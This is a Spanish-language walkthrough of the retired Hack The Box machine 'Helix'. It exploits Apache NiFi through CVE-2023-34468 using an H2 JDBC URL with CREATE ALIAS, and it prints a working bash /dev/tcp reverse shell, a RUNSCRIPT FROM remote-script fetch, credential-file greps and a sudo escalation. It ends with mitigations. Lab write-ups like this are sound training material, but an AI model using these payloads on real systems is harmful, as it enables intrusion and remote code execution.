---
machine: Helix
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-nifi, h2, ics, cve-2023-34468, opc-ua]
---

# Helix — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un flujo industrial simulado sobre **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). El procesador `ExecuteSQL` acepta un `DBCPConnectionPool` con la URL JDBC que le pongas: apuntándolo a un **H2** propio con `CREATE ALIAS` se ejecuta Java dentro de la JVM de NiFi (**CVE-2023-34468**) y sale shell como `nifi`. Después, un backup de clave SSH en los soportes del servicio da acceso a `operator`, y la escalada llega por el servicio OPC UA interno y la consola de mantenimiento.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
```

```text
22/tcp    ssh
80/tcp    nginx
8080/tcp  Apache NiFi 1.21.0 (vhost flow.helix.htb)
```

```bash
echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
```

La UI de NiFi está operativa con el canvas accesible o con credenciales débiles de instalación.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. Crear un **Controller Service** `DBCPConnectionPool` con:

```text
Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:   org.h2.Driver
```

2. Añadir un procesador `ExecuteSQL` que use ese servicio y lanzar:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')
```

3. Arrancar el procesador y enviar un flowfile.

```bash
nc -lvnp 4444
```

```text
nifi@helix:/opt/nifi/nifi-current$
```

Variante cuando el INIT no cabe en la URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, con el `CREATE ALIAS` y el `CALL` en el script.

## Movimiento lateral

```bash
find /opt/nifi -iname "*.bak" -o -iname "*.zip" -o -iname "id_*" 2>/dev/null
cat /opt/nifi/nifi-current/conf/*.properties | grep -i "pass\|secret"
```

De los backups del soporte sale una clave privada SSH y el usuario `operator`. También hay un PDF protegido en su home cuyo contenido apunta al servicio interno.

## Escalada de privilegios

```bash
ss -ltnp | grep -v 127.0.0.1
```

Aparece el **OPC UA** interno (4840) del simulador industrial. Desde la red interna se publica un tag que dispara la ventana de mantenimiento; durante esa ventana se puede ejecutar la consola de mantenimiento permitida por `sudo`:

```bash
sudo -l
sudo /usr/local/bin/maintenance-console
```

Con eso, comandos como root.

## Evidencia

```text
/home/operator/user.txt  -> <user_flag>
/root/root.txt           -> <root_flag>
```

## Lecciones aprendidas

- Cualquier procesador que acepte una **URL JDBC** es un primitivo de RCE en Java si el driver H2 está en el classpath.
- `INIT=`, `RUNSCRIPT FROM` y `CREATE ALIAS` son la tríada clásica de H2, reciclada de Spring Boot a NiFi.
- Los backups de configuración de un servicio suelen llevar claves y secretos en claro.
- Mitigación: drivers JDBC en allowlist, sin `INIT` en URLs, NiFi sin acceso desde la red de usuarios, y `sudo` solo para acciones concretas y auditadas.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
